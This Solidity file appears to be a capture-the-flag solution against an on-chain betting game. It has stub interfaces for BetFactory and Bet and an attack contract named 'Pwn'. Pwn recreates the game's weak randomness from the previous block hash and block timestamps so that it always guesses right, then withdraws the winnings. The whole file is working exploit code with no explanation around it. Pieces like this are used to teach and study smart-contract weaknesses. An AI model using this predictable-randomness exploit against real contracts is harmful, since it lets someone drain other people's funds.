// SPDX-License-Identifier: MIT
pragma solidity >=0.7.0;

contract BetFactory {
    function create() public payable {}
    function validate (uint token) public {}
}

contract Bet {
    function bet (uint guess) public payable {}
    function getRandom () internal returns(uint) {}
}

contract Pwn {
    address target;
    uint seed;

    function create( address _factory ) public payable
    {
        BetFactory factory = BetFactory( _factory );
        factory.create{ value: msg.value }();
        seed = block.timestamp;
    }

    function validate( address _factory, uint token ) public
    {
        BetFactory factory = BetFactory( _factory );
        factory.validate( token );
    }

    function bet( address _target ) public payable
    {
        target = _target;
        Bet instance = Bet( target );
        uint rand = seed ^ uint(blockhash(block.number - 1));
        seed ^= block.timestamp;
        instance.bet{ value: msg.value }(rand);
    }

    function withdraw () public
    {
        msg.sender.call{ value: address(this).balance }("");
    }
}